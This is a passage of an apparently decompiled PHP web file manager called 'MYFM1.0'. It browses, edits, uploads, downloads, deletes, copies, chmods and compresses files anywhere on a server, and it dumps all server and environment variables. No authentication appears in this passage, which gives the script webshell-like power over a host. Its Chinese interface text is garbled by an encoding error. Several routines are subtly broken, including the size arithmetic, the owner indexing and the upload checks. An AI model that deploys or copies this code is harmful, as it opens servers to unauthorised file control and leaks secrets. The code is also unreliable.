								echo "\r\n<table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n<form action=\"{$this->self}?dir={$this->dir}\" method=\"post\">\r\n  <tr> \r\n    <td colspan=\"2\">����ѡ�\r\n      <input type=\"button\" name=\"Submit9\" value=\"ȫ��ѡ��\" onclick=\"this.value=check(this.form)\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"����\" onclick=\"really(this.form,'cut','��ȷ��Ҫ������ѡ�ļ���')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"����\" onclick=\"really(this.form,'copy','��ȷ��Ҫ������ѡ�ļ���')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"ճ��\" onclick=\"really(this.form,'parse','��ȷ�ϼ��а��ļ��ڴ�ճ����')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"�༭\" onclick=\"really(this.form,'edit','��ȷ����ѡ�ļ����Ա༭��')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"�ļ�ͳ��\" onclick=\"really(this.form,'stat','ȷ�ϲ鿴��ѡ�ļ���״̬��?')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"�����ļ�\" onclick=\"really(this.form,'down','ȷ�����ظ��ļ���')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"ɾ���ļ�\" onclick=\"really(this.form,'del','��ȷ��Ҫɾ����ѡ�ļ��𣡲������ɻָ�')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"��������\" onclick=\"system(this.form,'chmod','����д��Ҫ���ĵ�����','0777')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"��������\" onclick=\"system(this.form,'rename','����д��Ҫ�ĵ����ļ�����','newrename')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"ZIPѹ��\" onclick=\"system(this.form,'zip','����д��Ҫѹ�����ļ���','newzip.zip')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"GZѹ��\" onclick=\"system(this.form,'gz','����д��Ҫѹ�����ļ���','newgz.gz')\">\r\n      <input type=\"button\" name=\"Submit10\" value=\"��ѹ�ļ�\" onclick=\"system(this.form,'unzip','����д��Ҫ��ѹ��Ŀ¼','{$this->dir}')\">\r\n    </td>\r\n  </tr>\r\n  <tr valign=\"top\"> \r\n    <td width=\"50%\" height=\"24\"> \r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <tr> \r\n          <td width=\"13%\" bgcolor=\"#999999\">ѡ��</td>\r\n          <td width=\"27%\" bgcolor=\"#999999\">Ŀ¼����</td>\r\n          <td width=\"13%\" bgcolor=\"#999999\">Ŀ¼����</td>\r\n          <td width=\"14%\" bgcolor=\"#999999\">ӵ����</td>\r\n          <td width=\"33%\" bgcolor=\"#999999\">�޸�ʱ��</td>\r\n        </tr>\r\n      </table>";
								$i = 0;
								for ( ;	$i < $data['dir']['num'];	++$i	)
								{
												echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <tr> \r\n          <td width=\"13%\"> \r\n            <input type=\"checkbox\" name=\"file[]\" value=\"".$data['dir']['name'][$i]."\"></td>\r\n          <td width=\"27%\"><a href=\"{$this->self}?dir=".$this->dir.$data['dir']['name'][$i]."\">".$data['dir']['name'][$i]."</a></td>\r\n          <td width=\"13%\">".$data['dir']['chmod'][$i]."</td>\r\n          <td width=\"14%\">".$data['dir']['owner'][$i]."</td>\r\n          <td width=\"33%\">".$data['dir']['time'][$i]."</td>\r\n        </tr>\r\n      </table>";
								}
								echo "</td>\r\n    <td width=\"50%\" height=\"24\"> \r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <tr> \r\n          <td width=\"13%\" bgcolor=\"#999999\">ѡ��</td>\r\n          <td width=\"27%\" bgcolor=\"#999999\">�ļ�����</td>\r\n          <td width=\"13%\" bgcolor=\"#999999\">�ļ�����</td>\r\n          <td width=\"14%\" bgcolor=\"#999999\">�ļ���С</td>\r\n          <td width=\"33%\" bgcolor=\"#999999\">�޸�ʱ��</td>\r\n        </tr>\r\n      </table>";
								$i = 0;
								for ( ;	$i < $data['file']['num'];	++$i	)
								{
												echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n        <tr> \r\n          <td width=\"13%\"> \r\n            <input type=\"checkbox\" name=\"file[]\" value=\"".$data['file']['name'][$i]."\"></td>\r\n          <td width=\"27%\"><a href=\"{$this->url}{$this->dir}".$data['file']['name'][$i]."\" target=\"_blank\">".$data['file']['name'][$i]."</a></td>\r\n          <td width=\"13%\">".$data['file']['chmod'][$i]."</td>\r\n          <td width=\"14%\">".@number_format( $data['file']['size'][$i] / 1024, 3 )."</td>\r\n          <td width=\"33%\">".$data['file']['time'][$i]."</td>\r\n        </tr>\r\n      </table>";
								}
								echo "</td>\r\n  </tr>\r\n</form>\r\n</table>";
								if ( $this->action == "show" )
								{
												echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n         <tr>\r\n          <td width=\"50%\" align=\"center\"><a href=\"{$this->self}?dir={$this->dir}\">������ʾ�ر�</a></td>\r\n        </tr>\r\n      </table>\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n         <tr>\r\n          <td width=\"50%\" align=\"center\">��������</td>\r\n          <td width=\"50%\" align=\"center\">������ֵ</td>\r\n        </tr>\r\n      </table>";
												foreach ( $GLOBALS['_SERVER'] as $key => $value )
												{
																echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n         <tr>\r\n          <td width=\"50%\" align=\"center\">\$_SERVER[{$key}]</td>\r\n          <td width=\"50%\" align=\"center\">{$value}</td>\r\n        </tr>\r\n      </table>";
												}
												foreach ( $GLOBALS['_ENV'] as $key => $value )
												{
																echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n         <tr>\r\n          <td width=\"50%\" align=\"center\">\$_ENV[{$key}]</td>\r\n          <td width=\"50%\" align=\"center\">{$value}</td>\r\n        </tr>\r\n      </table>";
												}
								}
								else
								{
												echo "\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\">\r\n         <tr>\r\n          <td width=\"50%\" align=\"center\"><a href=\"{$this->self}?dir={$this->dir}&action=show\">������ʾ��</a></td>\r\n        </tr>\r\n      </table>";
								}
								echo "\r\n<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"1\">\r\n  <tr>\r\n    <td align=\"center\" bgcolor=\"#999999\">MYFM1.0�ļ�����,����:cqlc,��ҳ:<a href=\"http://www.cqlc.net\">http://www.cqlc.net</a></td>\r\n  </tr>\r\n</table>\r\n</body>\r\n</html>";
				}

				function get_post( )
				{
								$count = 0;
								foreach ( $GLOBALS['_POST']['file'] as $value )
								{
												if ( !empty( $value ) && $value != "." && $value != ".." )
												{
																$this->file[] = $value;
												}
								}
				}

				function get_list( $dir )
				{
								$b = array( );
								$b['dir']['num'] = 0;
								$b['file']['num'] = 0;
								if ( !( substr( $dir, -1 ) == "/" ) )
								{
												$dir .= "/";
								}
								if ( !( $fp = dir( $dir ) ) )
								{
												return 0;
								}
								while ( $tmp = $fp->read( ) )
								{
												if ( $tmp != "sys" )
												{
																$f[] = $tmp;
												}
								}
								sort( $f );
								foreach ( $f as $value )
								{
												if ( $value )
												{
																if ( is_dir( $dir.$value ) )
																{
																				$b['dir']['name'][$b['dir']['num']] = $value;
																				$b['dir']['owner'][$b['file']['num']] = @fileowner( $dir.$value );
																				$b['dir']['chmod'][$b['dir']['num']] = @substr( @base_convert( @fileperms( $dir.$value ), 10, 8 ), -4 );
																				$b['dir']['time'][$b['dir']['num']] = @date( "Y-n-d H:i", @filectime( $dir.$value ) );
																				++$b['dir']['num'];
																}
																else
																{
																				$b['file']['name'][$b['file']['num']] = $value;
																				$b['file']['owner'][$b['file']['num']] = @fileowner( $dir.$value );
																				$b['file']['chmod'][$b['file']['num']] = @substr( @base_convert( @fileperms( $dir.$value ), 10, 8 ), -4 );
																				$b['file']['time'][$b['file']['num']] = @date( "Y-n-d H:i", @filectime( $dir.$value ) );
																				$b['file']['size'][$b['file']['num']] = @number_format( filesize( $dir.$value ) / 1.24, 1 );
																				++$b['file']['num'];
																}
												}
								}
								return $b;
				}

				function set_tmp( $mod, $domain, $file = array( ) )
				{
								if ( !( $fp = @fopen( $this->tmp_file, "w" ) ) )
								{
												return 0;
								}
								fwrite( $fp, "<?die;?>:".$mod.":".$domain.":" );
								foreach ( $file as $value )
								{
												fwrite( $fp, "|".$value );
								}
								fclose( $fp );
								return 1;
				}

				function get_tmp( )
				{
								$a = explode( ":", join( "", file( $this->tmp_file ) ) );
								$b['mod'] = $a[1];
								$b['domain'] = $a[2];
								$b['file'] = array_slice( explode( "|", $a[3] ), 1 );
								return $b;
				}

				function del( $file )
				{
								@chmod( $file, 511 );
								if ( is_dir( $file ) )
								{
												if ( !( substr( $file, -1 ) == "/" ) )
												{
																$file .= "/";
												}
												if ( !( $fp = @dir( $file ) ) )
												{
																return 0;
												}
												while ( $f = $fp->read( ) )
												{
																if ( $f != "." && $f != ".." )
																{
																				$this->del( $file.$f );
																}
												}
												$fp->close( );
												if ( @rmdir( $file ) )
												{
																return 1;
												}
												else
												{
																return 0;
												}
								}
								else if ( @unlink( $file ) )
								{
												return 1;
								}
								else
								{
												return 0;
								}
				}

				function copy( $dir, $file, $newdir )
				{
								if ( !( substr( $dir, -1 ) == "/" ) )
								{
												$dir .= "/";
								}
								if ( substr( $file, -1 ) == "/" )
								{
												$file = substr( $file, 0, strlen( $file ) );
								}
								if ( !( substr( $newdir, -1 ) == "/" ) )
								{
												$newdir .= "/";
								}
								if ( is_dir( $dir.$file ) )
								{
												@mkdir( $newdir.$file, 511 );
												if ( !( $fp = @dir( $dir.$file ) ) )
												{
																return 0;
												}
												while ( $f = $fp->read( ) )
												{
																if ( $f != "." && $f != ".." )
																{
																				$this->copy( $dir, $file."/".$f, $newdir );
																}
												}
												$fp->close( $fp );
												return 1;
								}
								else if ( @copy( $dir.$file, $newdir.$file ) )
								{
												return 1;
								}
								else
								{
												return 0;
								}
				}

				function edit( $file, $content = "" )
				{
								if ( $content == "" )
								{
												if ( !( $fp = fopen( $file, "r" ) ) )
												{
																return 0;
												}
												return fread( $fp, @filesize( $file ) );
								}
								else
								{
												if ( !( $fp = fopen( $file, "w" ) ) )
												{
																return 0;
												}
												@fwrite( $fp, $content );
												@fclose( $fp );
												return 1;
								}
				}

				function down( $file )
				{
								$filename = substr( strrchr( $file, "/" ), 1 );
								$fileext = substr( strrchr( $filename, "/" ), 1 );
								header( "Content-type: application/x-".$fileext );
								header( "Content-Disposition: attachment; filename=".$filename );
								header( "Content-Description: PHP3 Generated Data" );
								readfile( $file );
								exit( );
				}

				function upload( $filename, $dir, $mod = 1 )
				{
								global $HTTP_POST_FILES;
								$upfile = $HTTP_POST_FILES;
								if ( !( substr( $dir, -1 ) == "/" ) )
								{
												$dir .= "/";
								}
								$count = 0;
								if ( $mod == 1 )
								{
												$i = 0;
												for ( ;	$i < count( $upfile[$filename]['tmp_name'] );	++$i	)
												{
																if ( !file_exists( $upfile[$filename]['tmp_name'][$i] ) && !@copy( $upfile[$filename]['tmp_name'][$i], $this->root_dir.$dir.$upfile[$filename]['name'][$i] ) )
																{
																				++$count;
																}
												}
								}
								else
								{
												$i = 0;
												for ( ;	$i < count( $upfile[$filename]['tmp_name'] );	++$i	)
												{
																if ( !( file_exists( $upfile[$filename]['tmp_name'][$i] ) && !file_exists( $this->root_dir.$this->dir.$upfile[$filename]['name'][$i] ) ) && !@copy( $upfile[$filename]['tmp_name'][$i], $this->root_dir.$dir.$upfile[$filename]['name'][$i] ) )
																{
																				++$count;
																}
												}
								}
								return $count;
				}

				function gz( $gzfile, $file )
				{
								if ( !( $fp = fopen( $file, "rb" ) ) )
								{
												return 0;
								}
								$msg = fread( $fp, filesize( $file ) );
								fclose( $fp );
								if ( !( $fp = gzopen( $gzfile, "wb" ) ) )
								{
												return 0;
								}
								$msg = gzwrite( $fp, $msg );
								gzclose( $fp );
								return 1;
				}

				function stat( $dir )
				{
								if ( is_dir( $dir ) )
								{
												if ( !( substr( $dir, -1 ) == "/" ) )
												{
																$dir .= "/";
												}
												if ( !( $fp = @dir( $dir ) ) )
												{
																return 0;
												}
												while ( $f = $fp->read( ) )
												{
																if ( $f != "." && $f != ".." )
																{
																				$this->stat( $dir.$f );
																}
												}
												$fp->close( );
												++$this->stat['dir_num'];
								}
								else
								{
												$this->stat['size'] += @filesize( $dir );
												++$this->stat['file_num'];
								}
				}

				function search( $dir, $key )
				{
								if ( is_dir( $this->root_dir.$dir ) )
								{
												if ( !( substr( $dir, -1 ) == "/" ) )
												{
																$dir .= "/";
												}
												if ( !( $fp = @dir( $this->root_dir.$dir ) ) )
												{
																return 0;
												}
												while ( $f = $fp->read( ) )
												{
																if ( $f == $key )
																{
																				$this->msg .= $dir.$f."<br>";
																}
																if ( $f != "." && $f != ".." )
																{
																				$this->search( $dir.$f, $key );
																}
												}
												$fp->close( );
								}
				}

}

new myfm( );
exit( );
?>
